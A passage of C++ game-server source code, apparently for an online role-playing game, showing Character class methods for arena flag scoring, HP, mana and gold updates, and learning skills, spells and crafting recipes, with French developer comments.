            PacketPuppetInfo( sending );
            Broadcast::BCast( GetWL(), _DEFAULT_RANGE, sending, GetInvisibleQuery() );

            //perd le drapeau
            AddArenaPOINTS(-10,"Lost Flag"); //(NM:Regle 4)
            

         }
         else if((GetUnderBlockMap() == __ARENAGAME_BT_FULL_PVP && GetArenaTeam() == 1 && ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG) >0) ||
                 (GetUnderBlockMap() == __ARENAGAME_RT_FULL_PVP && GetArenaTeam() == 2 && ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG) >0)    )
         {

            if(GetArenaType() == ARENE2_TYPE)
            {
               if(GetArenaTeam() == 1 && Arena2Master::GetItemID1Home(GetArenaID()-1) == 0) //le flag de notre equipe pas en place on ne marque pas de point
                  return WL;
               if(GetArenaTeam() == 2 && Arena2Master::GetItemID2Home(GetArenaID()-1) == 0) //le flag de notre equipe pas en place on ne marque pas de point
                  return WL;
            }
            Broadcast::BCSpellEffect( GetWL(), _DEFAULT_RANGE, 30304/*LevelUpSkin*/, GetID(), 0, GetWL(),GetWL(),GetNextGlobalEffectID(),0);

            _LOG_ARENA
               LOG_ALWAYS,
               "ARENE%d ID %d: Player ID:%d %s (%s) Scoore for his team",GetArenaID(),GetArenaType(),
               GetID(),
               GetTrueName(),
               GetPlayer()->GetFullAccountName()
               LOG_

            CString strTmp;
            if(GetArenaTeam() == 1)
            {
               strTmp.Format(_STR( 15488, GetLang() ),GetTrueName());
               if(GetArenaType() == ARENE1_TYPE)
                  Arena1Master::SendMessageToAll(strTmp,CL_BLUE_2,GetArenaID()-1);
               else if(GetArenaType() == ARENE2_TYPE)
                  Arena2Master::SendMessageToAll(strTmp,CL_BLUE_2,GetArenaID()-1);
            }
            else
            {
               strTmp.Format(_STR( 15489, GetLang() ),GetTrueName());
               if(GetArenaType() == ARENE1_TYPE)
                  Arena1Master::SendMessageToAll(strTmp,CL_RED,GetArenaID()-1);
               else if(GetArenaType() == ARENE2_TYPE)
                  Arena2Master::SendMessageToAll(strTmp,CL_RED,GetArenaID()-1);
            }
            
            AddArenaPOINTS(10,"+1 Score"); //(NM:Regle 5)

            SetArenaFlag(GetArenaFlag()+1);
            //on est dans sa zone et on a le drapeau...
            
            if(GetArenaType() == ARENE1_TYPE)
            {
               Arena1Master::SummonFlagRnd(GetArenaID()-1);
               Arena1Master::IncreasePoint(GetPlayer(),GetArenaID()-1);
            }
            else if(GetArenaType() == ARENE2_TYPE)
            {
               Arena2Master::SummonFlagHome(ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG)-1,GetArenaID()-1);
               Arena2Master::IncreasePoint(GetPlayer(),GetArenaID()-1);
            }

            //on incremente points on repod le drapeau, le vire du user...
            SetFlag(__FLAG_NMS_TAG_DISPLAY_OVER_HEAD,0);
            SetFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG,0);
            TFCPacket sending;
            PacketPuppetInfo( sending );
            Broadcast::BCast( GetWL(), _DEFAULT_RANGE, sending, GetInvisibleQuery() );
            
         }
      }
   }

   return WL;
}
/******************************************************************************/
WORD Character::GetClan()
/******************************************************************************/
{
   return clan;
}
/******************************************************************************/
void Character::SetClan(WORD newClan)
/******************************************************************************/
{
   clan = newClan;
}
/******************************************************************************/
// This functions returns the max HP of a player
DWORD Character::GetTrueMaxHP()
/******************************************************************************/
{
   return MaxHP ? MaxHP : 1;
}
/******************************************************************************/
// This functions returns the max HP of a player
void Character::SetMaxHP(DWORD newHP)
/******************************************************************************/
{
   MaxHP = newHP;

   TFCPacket sending;
   sending << (RQ_SIZE)RQ_HPchanged;
   sending << (long)GetHP();
   sending << (long)GetMaxHP();
   SendPlayerMessage( sending );
}
/******************************************************************************/
// This functions returns the max HP of a player
DWORD Character::GetHP()
/******************************************************************************/
{
   return HP;
}
/******************************************************************************/
// This functions returns the max HP of a player
void Character::SetHP(DWORD newHP, bool boUpdate )
/******************************************************************************/
{
   // If HP actually changed.
   if( HP != newHP )
   {
      HP = newHP;

      if( boUpdate )
      {
         TFCPacket sending;
         sending << (RQ_SIZE)RQ_HPchanged;
         sending << (long)GetHP();
         sending << (long)GetMaxHP();
         SendPlayerMessage( sending );

         // If player is in a group.
         if( GetGroup() != NULL )
         {
            // Tell the group of the update.
            GetGroup()->SendHpUpdate( this );
         }
      }
   }
}
/******************************************************************************/
// This functions returns the max HP of a player
WORD Character::GetTrueMaxMana()
/******************************************************************************/
{
   return MaxMana;
}
/******************************************************************************/
// This functions returns the max HP of a player
void Character::SetMaxMana(WORD newMaxMana)
/******************************************************************************/
{
   MaxMana = newMaxMana;
}
/******************************************************************************/
// This functions returns the max HP of a player
WORD Character::GetMana()
/******************************************************************************/
{
   return Mana;
}
/******************************************************************************/
// This functions returns the max HP of a player
void Character::SetMana(WORD newMana, BOOL boEcho )
/******************************************************************************/
{
   Mana = newMana;

   if( boEcho )
   {
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_ManaChanged;
      sending << (short)newMana;

      SendPlayerMessage( sending );
   }
}

void Character::NeedUpdateGold()
{
   try
   {
      CAutoLock autoStatsLock( &statsLockGold );
      if(bNeedUpdateGold)
      {
         if(bNeedUpdateGoldMsg)
         {
            char buf[ 1024 ];
            sprintf_s( buf, 1024, _STR( 7508, GetLang() ), dwGoldAcc );
            SendSystemMessage( buf );
         }

         TFCPacket sending;
         sending << (RQ_SIZE)RQ_GoldChange;

         if( gameopContext != NULL )
            sending << (long)gameopContext->GetGold();   
         else
            sending << (long)GetGold();
         SendPlayerMessage( sending );
         bNeedUpdateGold    = FALSE;
         bNeedUpdateGoldMsg = FALSE;
      }
      dwGoldAcc = 0;
   }
   catch(...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::NeedUpdateGold"
         LOG_
   }
}
/******************************************************************************/
// Returns the gold on the player
int Character::GetGold()
/******************************************************************************/
{
   CAutoLock autoStatsLock( &statsLockGold );
   return PlayerGold; //return de get gold
}
/******************************************************************************/
// Sets the gold on a player
void Character::SetGold(int newGold, BOOL boEcho )
/******************************************************************************/
{
   CAutoLock autoStatsLock( &statsLockGold );
   // Can't hold any debts :) rofl
   DWORD dwOldGold = PlayerGold; //Set Gold

   newGold = newGold < 0 ? 0 : newGold;
   PlayerGold = newGold;

   SynchronizeGold();

   if( boEcho && newGold > dwOldGold )
   {
      bNeedUpdateGoldMsg = TRUE;
      dwGoldAcc += ( PlayerGold - dwOldGold);
   }

   bNeedUpdateGold = TRUE;
}

/******************************************************************************/
// sets the name of the character
void Character::SetName(CString newName)
/******************************************************************************/
{
   PlayerName = newName;
}
/******************************************************************************/
// returns the name of the character
CString Character::GetName()
/******************************************************************************/
{
   // If the pseudoname doesn't exist.
   if( csPseudoName.IsEmpty() )
   {
      // Return the true player name.
      return PlayerName;
   }
   // Otherwise return the pseudo name.
   return csPseudoName;
}
/******************************************************************************/
// Wrapper for the GetName() function
CString Character::GetName(WORD wLang)
/******************************************************************************/
{
   return GetName();
}
/******************************************************************************/
// Returns the only true name of a character. If you know you're getting the name of
// a character in a non-game related purpose, use this function.
CString Character::GetTrueName()
/******************************************************************************/
{
   return PlayerName;
}
/******************************************************************************/
//  Sets a character's pseudo name. The character's name will be displayed this way,
//  but it won't affect other functions.
void Character::SetPseudoName(CString csName) // The new pseudo-name
/******************************************************************************/
{
   csPseudoName = csName;
}
/******************************************************************************/
// returns the exhaust of a PC
EXHAUST Character::GetExhaust()
/******************************************************************************/
{
   return exhaust;
}
/******************************************************************************/
// Sets the exhaust of a PC
void Character::SetExhaust(EXHAUST dfd)
/******************************************************************************/
{	
   Players *pPlayer = (Players *)ThisPlayer;
   if ( pPlayer != NULL && pPlayer->IsGod())
   {
      if(dfd.move > TFCMAIN::GetRound() + (200 MILLISECONDS))
         dfd.move = TFCMAIN::GetRound() + (200 MILLISECONDS);
   }
   exhaust = dfd;
}

unsigned long Character::GetLastMoveTime()
{
   return LastMoveTime;
}

void Character::SetLastMoveTime()
{
   LastMoveTime = TFCMAIN::GetRound();
}


/******************************************************************************/
// Uses bQuantity skill pnts, returns TRUE if the decrementation was posible
BOOL Character::UseSkillPnts(WORD bQuantity)
/******************************************************************************/
{
   if(wNbSkillPnts < bQuantity)
   {
      return FALSE;
   }
   wNbSkillPnts = (WORD)( wNbSkillPnts - bQuantity );

   return TRUE;
}
/******************************************************************************/
// Uses bQuantity stat pnts, returns TRUE if the decrementation was posible
BOOL Character::UseStatPnts(WORD wQuantity)
/******************************************************************************/
{
   if(wNbStatPnts < wQuantity)
   {
      return FALSE;
   }
   wNbStatPnts -= (WORD)wQuantity;

   return TRUE;
}
/******************************************************************************/
// Adds skill points to a skill
BOOL Character::TrainSkillPnt(int nID, int nQuantity, WORD wMax )
/******************************************************************************/
{
   LPUSER_SKILL lpusUserSkill = GetSkill( nID );

   if(lpusUserSkill)
   {
      // If NPC can't teach more
      if( lpusUserSkill->GetTrueSkillPnts() + nQuantity > wMax )
      {
         nQuantity = wMax - lpusUserSkill->GetTrueSkillPnts();
      }

      if( nQuantity > 0 )
      {
         // Uses skill points
         if( UseSkillPnts( (WORD)nQuantity ) )
         {
            // If ID is a skill
            if( nID < SPELL_ID_OFFSET )
            {
               Skills::TrainSkill(this, lpusUserSkill, nQuantity);
            }
            else
            {
               // Otherwise, if its a spell.
               lpusUserSkill->SetSkillPnts( lpusUserSkill->GetTrueSkillPnts() + nQuantity );
            }
         }
         else
         {
            return FALSE;
         }
      }
      else
      {
         return FALSE;
      }
   }

   return TRUE;
}
/******************************************************************************/
// Called when character succefully hits
int Character::attack_hit(LPATTACK_STRUCTURE s_asBlow, Unit *lpuTarget)
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return 0;
   }
   /// *****E_NMS_DEATH 

   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE);

   // Query attack hit effects
   QueryEffects( MSG_OnAttackHit, s_asBlow, NULL, lpuTarget );

   int attackID;
   // Query objects for attackhit

   if(equipped[body])		equipped[body]		->SendUnitMessage(MSG_OnAttackHit, equipped[body], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[belt])		equipped[belt]		->SendUnitMessage(MSG_OnAttackHit, equipped[belt], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[feet])		equipped[feet]		->SendUnitMessage(MSG_OnAttackHit, equipped[feet], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[gloves])	equipped[gloves]	->SendUnitMessage(MSG_OnAttackHit, equipped[gloves], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[helm])		equipped[helm]		->SendUnitMessage(MSG_OnAttackHit, equipped[helm], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[legs])		equipped[legs]		->SendUnitMessage(MSG_OnAttackHit, equipped[legs], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[ring1])        equipped[ring1]       ->SendUnitMessage(MSG_OnAttackHit, equipped[ring1], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[ring2])        equipped[ring2]       ->SendUnitMessage(MSG_OnAttackHit, equipped[ring2], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[Orbe1])        equipped[Orbe1]       ->SendUnitMessage(MSG_OnAttackHit, equipped[Orbe1], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[bracelets])    equipped[bracelets]   ->SendUnitMessage(MSG_OnAttackHit, equipped[bracelets], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[necklace])     equipped[necklace]    ->SendUnitMessage(MSG_OnAttackHit, equipped[necklace], this, lpuTarget, s_asBlow, &attackID);
   if(equipped[weapon_right]) equipped[weapon_right]->SendUnitMessage(MSG_OnAttackHit, equipped[weapon_right], this, lpuTarget, s_asBlow, &attackID);		
   if(equipped[weapon_right] != equipped[weapon_left])// if it's not a two handed weapon	
   {
      if(equipped[weapon_left])
      {
         _item *obj = NULL;
         equipped[weapon_left ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &obj);
         if(obj && obj->item_type == 1 && obj->weapon.ranged == 0)
         {
            // on compte pas le strike ici des dual weapon, le skill comptera le degat...
         }
         else
         {
            equipped[weapon_left] ->SendUnitMessage(MSG_OnAttackHit, equipped[weapon_left], this, lpuTarget, s_asBlow, &attackID);
         }
      }
   }

   // Process all attack-intrinsic skills
   tlusSkills[Hook_OnAttack].ToHead();

   while(tlusSkills[Hook_OnAttack].QueryNext())
   {
      LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnAttack].Object();

      Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_ATTACK,
         this, NULL, lpuTarget, s_asBlow, NULL, lpusUserSkill);
   }
   return 0;
}
/******************************************************************************/
// Hooks the unit SendUnitMessage function to capture special messages
/******************************************************************************/
BOOL Character::SendUnitMessage(
                                UINT MessageID,
                                Unit *self,
                                Unit *medium,
                                Unit *target, 
                                void *valueIN,
                                void *valueOUT)
                                /******************************************************************************/
{
   BOOL boReturnValue = FALSE;

   if (MessageID == MSG_OnGetUnitStructure) 
   {
      *(Character **)(valueOUT) = this;
      boReturnValue = TRUE;
   }

   return boReturnValue;
}
/******************************************************************************/
// This function sends a packet message to a player through the unit interface which is 
// the only handled structure of DLLs.
void Character::SendPlayerMessage(TFCPacket &sending)
/******************************************************************************/
{
   Players *lpPlayer = (Players *)ThisPlayer;

   // If player hasn't been deleted.
   if( lpPlayer != NULL )
   {
      WorldPos wlPos = { -1, -1, -1 };

      // Send message.
      CPacketManager::SendPacket(sending,lpPlayer->IPaddrO,lpPlayer->IPaddrI,-1,wlPos,FALSE); //OK
   }
}

//NMNMNM_XP_NEW MEthod
/////////////////////////////////////////////////////////////////////////////////////////////
// virtual fonction
void Character::SendPlayerXP(bool bForceUpdate)
{
   try
   {
      if(bForceUpdate || xpLastSend != GetXP())
      {
         xpLastSend = GetXP();
         TFCPacket sending;
         // This request only returns a new quantity of xp
         sending << (RQ_SIZE)RQ_XPchanged; //New XP send function to not send XP if not changed...
         sending << (long)(GetXP() >> 32);
         sending << (long)GetXP();
         SendPlayerMessage( sending );
      }
   }
   catch(...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::SendPlayerXP"
         LOG_
   }
}

void Character::SendIsXP()
{
   try
   {
      char chRPStatus = 0;
      if(GetNMModeRPPhaseID() >=0)
         chRPStatus = 1;

      TFCPacket sending;
      sending << (RQ_SIZE)RQ_RPStatus; 
      sending << (char)chRPStatus;
      SendPlayerMessage( sending );
   }
   catch(...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::SendIsXP"
         LOG_
   }
}

/******************************************************************************/
// This function uses a normal use skill
BOOL Character::UseSkill(int nID, Unit *uTarget, LPVOID lpValueOUT )
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   BOOL boFound = FALSE;
   BOOL boSuccess = FALSE;

   Disturbed(DISTURB_UNHIDE);

   DispellInvisibility();

   TRACE(" Using skill ID %u on target ID %u", nID, uTarget->GetID() );

   tlusSkills[ Hook_None ].ToHead();	
   while( tlusSkills[ Hook_None ].QueryNext() && !boFound )
   {
      LPUSER_SKILL lpusUserSkill = tlusSkills[ Hook_None ].Object();

      if( lpusUserSkill->GetSkillID() == nID )
      {
         // Retreive the target's pos to ensure skills receives its worldpos member
         WorldPos wlUnitPos = uTarget->GetWL();
         // Send use if used target
         int nReturn = Skills::ExecuteSkill( lpusUserSkill->GetSkillID(), HOOK_USE | HOOK_USE_TARGET_UNIT,
            this, NULL, uTarget, &wlUnitPos, lpValueOUT, lpusUserSkill );

         boFound = TRUE;

         if( nReturn == SKILL_SUCCESSFULL || nReturn == SKILL_PERSONNAL_FEEDBACK_SUCCESSFULL )
         {
            boSuccess = TRUE;
         }
      }
   }

   return boSuccess;
}
/******************************************************************************/
// This function uses a normal skill
BOOL Character::UseSkill(int nID, WorldPos wlPos)
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   BOOL boFound = FALSE;

   Disturbed(DISTURB_UNHIDE);
   DispellInvisibility();

   int nHook = 0;
   if( wlPos.X == 0 && wlPos.Y == 0 && wlPos.world == 0 )
   {			
      nHook = HOOK_USE_TARGET_POS;	// If a target pos was set, skill is used with target pos.
   }

   nHook |= HOOK_USE;	// Skill used.

   // Then process all move-intrinsic skills
   tlusSkills[Hook_None].ToHead();	
   while(tlusSkills[Hook_None].QueryNext() && !boFound)
   {
      LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_None].Object();

      if(lpusUserSkill->GetSkillID() == nID )
      {
         // Send use without target
         Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), nHook,
            this, NULL, NULL, &wlPos, NULL, lpusUserSkill);
         boFound = TRUE;
      }
   }

   return boFound;
}
/******************************************************************************/
// Regenerates mana and HP. Called at a regular (2 minutes) time.
// Will also call regeneration-specific skills
void Character::Regenerate( void )
/******************************************************************************/
{
   try
   {
      BOOL boFound = FALSE;

      GAME_RULES::HPregen( this );
      GAME_RULES::ManaRegen( this );

      // Then process all regen-intrinsic
      tlusSkills[Hook_OnRegen].ToHead();	
      while(tlusSkills[Hook_OnRegen].QueryNext() && !boFound)
      {
         LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnRegen].Object();
         Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_REGEN,this, NULL, NULL, NULL, NULL, lpusUserSkill);		
      }
   }
   catch(...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::Regenerate"
         LOG_
   }
}

void Character::ProcessNMDeath( void )
{
   try
   {
      int  dwDureeDeathMax = 1200; /*10 sec */ /*1200;*/ /*1 minutes*/
      if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) == 2 ) // mort PVP
         dwDureeDeathMax = 2400; // 1 minutes


      WORD wtCurrent = 0;
      WORD wtTotal   = dwDureeDeathMax/20;
      BYTE chCanRes  = 0;

      if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) == 0 )
      {
         //le pj est vivant on fou rien...
         return;
      }
      else if(ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER) == 0)
      {
         wtCurrent = dwDureeDeathMax/20;
         chCanRes  = 1;
      }
      else if(TFCMAIN::GetRound() < ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER) )
      {
         if(TFCMAIN::GetRound() > dwDureeDeathMax)
         {
            RemoveFlag(__FLAG_NMS_PLAYER_DEATH_TIMER);
            wtCurrent = dwDureeDeathMax/20;
            chCanRes  = 1;
         }

         else
         {
            if(TFCMAIN::GetRound() > (dwDureeDeathMax/2))
               chCanRes  = 1;

            //Dois calculer le temps restant...
            wtCurrent = TFCMAIN::GetRound()/20;
         }
      }
      else if(TFCMAIN::GetRound() >= ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER) + dwDureeDeathMax )
      {
         RemoveFlag(__FLAG_NMS_PLAYER_DEATH_TIMER);
         wtCurrent = dwDureeDeathMax/20;
         chCanRes  = 1;
      }
      else if(TFCMAIN::GetRound() >= ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER) + (dwDureeDeathMax/2) )
      {
         wtCurrent = ((TFCMAIN::GetRound() - ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER)) / 20);
         chCanRes  = 1;
      }
      else
      {
         //Dois calculer le temps restant...
         wtCurrent = ((TFCMAIN::GetRound() - ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER)) / 20);
      }

      //NMNMNM si mort PVM peu toujours restaurer... a savoir si ils veule
      //apparaitre temple ou rester a la meme place...
      if(ViewFlag( __FLAG_NMS_PLAYER_DEATH ) == 1)
         chCanRes  = 1;



      TFCPacket sending;
      sending << (RQ_SIZE)RQ_NM_DeathProgress;
      sending << ( short) wtCurrent;
      sending << ( short) wtTotal;
      sending << ( char ) chCanRes;

      SendPlayerMessage( sending );
   }
   catch (...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::ProcessNMDeath"
         LOG_
   }
}

void Character::InfoScrollXP( char chStatus ,unsigned short ushDelayMin)
{

   TFCPacket sending;
   sending << (RQ_SIZE)RQ_NM_XPScrollProgress;
   sending << ( char ) chStatus;
   sending << ( short ) ushDelayMin;

   SendPlayerMessage( sending );
}
void Character::InfoScrollOR( char chStatus ,unsigned short ushDelayMin)
{

   TFCPacket sending;
   sending << (RQ_SIZE)RQ_NM_ORScrollProgress;
   sending << ( char ) chStatus;
   sending << ( short ) ushDelayMin;

   SendPlayerMessage( sending );
}

// Appends a skill to the list of learned skills.
LPUSER_SKILL Character::LearnSkill(
                                   DWORD dwSkill, // Skill ID of the skill to learn
                                   WORD wCost,		// Cost of skill, and initial strength
                                   bool boEcho,       // true if we should echo messages.
                                   CString &errMsg
                                   )
                                   /******************************************************************************/
{
   LPUSER_SKILL lpusNewSkill = NULL;

   // If we DON'T have enough skill points to learn this skill
   if( wCost > wNbSkillPnts )
   {
      if( boEcho )
      {
         SendSystemMessage( _STR( 40, GetLang() ) );
      }
      errMsg.Format( 
         "Not enough skill points for skill %u! Cost %u, skill pnts=%u.",
         dwSkill,
         wCost, 
         wNbSkillPnts 
         );
      return NULL;
   }

   TRACE( "\r\nSkillID %u cost %u.", dwSkill, wCost );

   // If dwSkill is a skill
   if( dwSkill < SPELL_ID_OFFSET )
   {
      // Gets the skill pointer of the skill ID
      LPSKILL lpSkill = Skills::GetSkill(dwSkill);

      if(lpSkill)
      {
         // If player doesn't already have the skill
         if(!GetSkill(dwSkill))
         {
            BOOL boFoundOwner = FALSE;

            // If a skill has multiple hook, they should all share the same object
            lpusNewSkill = new USER_SKILL;
            lpusNewSkill->SetSkillID( dwSkill );
            lpusNewSkill->SetSkillPnts( 1 );	// Gets the cost in skill points.

            // If skill is useable, append it to the useable skills.
            if(lpSkill->nHook & HOOK_USE || lpSkill->nHook & HOOK_USE_TARGET_UNIT || lpSkill->nHook & HOOK_USE_TARGET_POS || lpSkill->nHook & HOOK_NOTHING )
            {
               // if player can actually train this skill
               ADD_TO_TRAINING_LIST( Hook_None )			
            }
            // If skill is cast on attacks.
            if(lpSkill->nHook & HOOK_ATTACK)
            {
               // if player can actually train this skill
               ADD_TO_TRAINING_LIST( Hook_OnAttack )
            }
            // If skill is cast when being attacked.
            if(lpSkill->nHook & HOOK_ATTACKED)
            {
               // if player can actually train this skill
               ADD_TO_TRAINING_LIST( Hook_OnAttacked)
            }
            // If skill is cast when being hit.
            if(lpSkill->nHook & HOOK_HIT)
            {
               // if player can actually train this skill
               ADD_TO_TRAINING_LIST( Hook_OnHit )
            }
            // If skill is used when moving.
            if(lpSkill->nHook & HOOK_MOVE)
            {
               // if player can actually train this skill
               ADD_TO_TRAINING_LIST( Hook_OnMove )
            }
            // If skill is used when training.
            if(lpSkill->nHook & HOOK_TRAINING)
            {
               // if player can actually train this skill
               ADD_TO_TRAINING_LIST( Hook_OnTraining )
            }
            // If skill is used when regenerating.
            if(lpSkill->nHook & HOOK_REGEN)
            {
               ADD_TO_TRAINING_LIST( Hook_OnRegen )
            }

			   if(theApp.dwEquilibrageNewSkillEnable == 1)
            {
				   // Moen_OK : if skill is used for spell attack (Night: A tester)
				   if(lpSkill->nHook & HOOK_SPELL_ATTACK)
               {
                  ADD_TO_TRAINING_LIST( Hook_OnSpellAttack )
               }
				   // Moen_OK : if skill is used when being attack by a spell  (Night: A tester)
				   if(lpSkill->nHook & HOOK_SPELL_ATTACKED)
               {
                  ADD_TO_TRAINING_LIST( Hook_OnSpellAttacked )
               }
            }
            // If no function used this object, then delete it.
            if(!boFoundOwner)
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL1,
                  "Could not find correct training hook for spell id %u.",
                  dwSkill
                  LOG_

                  if (lpusNewSkill != NULL)
                  {	
                     delete lpusNewSkill;
                     lpusNewSkill = NULL;
                  }

                  errMsg.Format( "Could not find any training hook for skill %u.", dwSkill );
            }
            else
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Successfully taught skill %u.",
                  dwSkill
                  LOG_

                  // Deduct the skill points
                  wNbSkillPnts -= wCost;

               if( boEcho )
               {
                  char buf[ 1024 ];
                  sprintf_s( buf, 1024, _STR( 7845, GetLang() ), lpSkill->GetName( GetLang() ) );
                  SendSystemMessage( buf );
               }
            }
         }
         else
         {
            errMsg.Format( "Player already has the skill %u.", dwSkill );
         }
      }
      else
      {
         _LOG_DEBUG
            LOG_DEBUG_LVL1,
            "User tried to learn an unexisting skill ( ID %u ).",
            dwSkill
            LOG_
            errMsg.Format( "Skill %u does not exist.", dwSkill );
      }
   }
   else
   {
      LPSPELL_STRUCT lpSpell = SpellMessageHandler::GetSpell( (WORD)dwSkill );
      // If spell exists
      if( lpSpell != NULL ){
         // Check if player already has this spell
         tlusSpells.Lock();

         BOOL boFound = FALSE;
         tlusSpells.ToHead();
         while( tlusSpells.QueryNext() && !boFound )
         {
            if( tlusSpells.Object()->GetSkillID() == (int)dwSkill )
            {
               boFound = TRUE;
            }
         }
         // If player doesn't already have this spell.
         if( !boFound )
         {			
            lpusNewSkill = new USER_SKILL;
            // If a skill has multiple hook, they should all share the same object			
            lpusNewSkill->SetSkillID( dwSkill );
            lpusNewSkill->SetSkillPnts( 1 );	// Gets the cost in skill points.

            // Deduct the skill points
            wNbSkillPnts -= wCost;

            if( boEcho )
            {
               char buf[ 1024 ];
               sprintf_s( buf, 1024, _STR( 7844, GetLang() ), lpSpell->GetName( GetLang() ) );
               SendSystemMessage( buf );
            }
            tlusSpells.AddToTail( lpusNewSkill );
         }
         else
         {
            errMsg.Format( "Player already has the spell %u.", dwSkill );
         }
         tlusSpells.Unlock();
      }
      else
      {
         errMsg.Format( "Spell %u does not exist.", dwSkill );
      }

   }
   return lpusNewSkill;
}
/******************************************************************************/

//////////////////////////////////////////////////////////////////////////////////////////
LPUSER_PROFESSION_F Character::LearnProfessionFormule(DWORD dwFormuleID,DWORD dwCost,bool boEcho,CString &errMsg)
{
   LPUSER_PROFESSION_F lpusNewFormule = NULL;

   // If we DON'T have enough Gold to learn this formule
   if( dwCost > GetGold() )
   {
      if( boEcho )
      {
         SendSystemMessage( _STR( 20, GetLang() ) );
      }
      errMsg.Format( 
         "Not enough gold for formule ID %u! Cost %u, you have %u.",
         dwFormuleID,
         dwCost, 
         GetGold() 
         );
      return NULL;
   }

   // If Formule Exist
   if( Professions::IsFormuleExist(dwFormuleID))
   {
      // Check if player already has this spell
      tlProfessionAcq.Lock();

      BOOL boFound = FALSE;
      tlProfessionAcq.ToHead();
      while( tlProfessionAcq.QueryNext() && !boFound )
      {
         if( tlProfessionAcq.Object()->ushID == (USHORT)dwFormuleID )
         {
            boFound = TRUE;
         }
      }

      // If player doesn't already have this spell.
      if( !boFound )
      {			
         lpusNewFormule = new USER_PROFESSION_F;
         lpusNewFormule->ushID = dwFormuleID;

         USHORT ushNewFormuleSkill = Professions::GetFormuleSkill(dwFormuleID);

         tlProfessionAcq.ToHead();
         BOOL bAdd = FALSE;
         while(tlProfessionAcq.QueryNext() && !bAdd)
         {
            LPUSER_PROFESSION_F lpCurrent = tlProfessionAcq.Object();
            if(ushNewFormuleSkill < Professions::GetFormuleSkill(lpCurrent->ushID))
            {
               tlProfessionAcq.AddToPrevious(lpusNewFormule);
               bAdd = TRUE;
            }
         }
         if(!bAdd)
            tlProfessionAcq.AddToTail( lpusNewFormule );

         if( boEcho )
         {
            char buf[ 1024 ];
            sprintf_s( buf,1024, _STR( 15018, GetLang() ), Professions::GetFormuleName(dwFormuleID) );
            SendSystemMessage( buf );
         }

         
      }
      else
      {
         errMsg.Format( "Player already has this FormuleID %u.", dwFormuleID );
      }
      tlProfessionAcq.Unlock();
   }
   else
   {
      errMsg.Format( "FormuleID %u does not exist.", dwFormuleID );
   }


   return lpusNewFormule;
}

BOOL Character::UnLearnProfessionFormule(DWORD dwFormuleID,CString &errMsg)
{
   // If Formule Exist
   if( Professions::IsFormuleExist(dwFormuleID))
   {
      // Check if player already has this spell
      tlProfessionAcq.Lock();

      BOOL boFound = FALSE;
      tlProfessionAcq.ToHead();
      while( tlProfessionAcq.QueryNext() && !boFound )
      {
         if( tlProfessionAcq.Object()->ushID == (USHORT)dwFormuleID )
         {
            LPUSER_PROFESSION_F lpuFormule = tlProfessionAcq.Object();
            delete lpuFormule;
            lpuFormule = NULL;
            tlProfessionAcq.Remove();
            boFound = TRUE;
         }
      }
      tlProfessionAcq.Unlock();
      if(boFound)
         return TRUE;
   }
   else
   {
      errMsg.Format( "FormuleID %u does not exist.", dwFormuleID );
   }


   return FALSE;
}


//////////////////////////////////////////////////////////////////////////////////////////
// This function returns the user-skill associated to the player.
LPUSER_SKILL Character::GetSkill(
                                 DWORD dwSkill // The skill to query.
                                 )
                                 /******************************************************************************/
{
   // Search through all the hooks for the first occurence of Skill. If a skill
   // is in multiple hooks, its object is shared by the lists so this will always return
   // the correct object.

   LPUSER_SKILL lpUserSkill = NULL;

   // If the ID is a spell
